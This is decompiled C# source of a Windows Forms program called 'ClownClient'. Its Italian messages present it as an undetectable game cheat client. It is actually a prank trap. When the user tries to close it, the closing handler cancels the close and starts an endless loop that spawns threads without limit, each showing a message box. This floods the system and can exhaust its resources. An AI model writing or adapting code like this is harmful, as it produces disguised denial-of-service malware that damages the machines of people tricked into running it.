using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace ClownClient
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private void ratDelSileMode()
		{
			for (;;)
			{
				new Thread(delegate()
				{
					Thread.CurrentThread.IsBackground = true;
					MessageBox.Show("AYAYAYAYY IL SORCIO ORA TI MANGIA");
				}).Start();
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000207C File Offset: 0x0000027C
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000208A File Offset: 0x0000028A
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Client 'andetektable' fatto da iTzVirtual! jk....", "CopyPaste is the way");
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000209C File Offset: 0x0000029C
		private void button1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Client 'andetektable' distrutto, stai sereno amico!", "CopyPaste is the way");
			Application.Exit();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000020B3 File Offset: 0x000002B3
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
			MessageBox.Show("Nutria del Sile rat ACTIVATED!", "ATTIVAZIONE RAT");
			new Thread(new ThreadStart(this.ratDelSileMode)).Start();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000020E2 File Offset: 0x000002E2
		private void button2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Ora sei oppato su " + this.textBox1.Text + ".", "CopyPaste is the way");
		}
	}
}
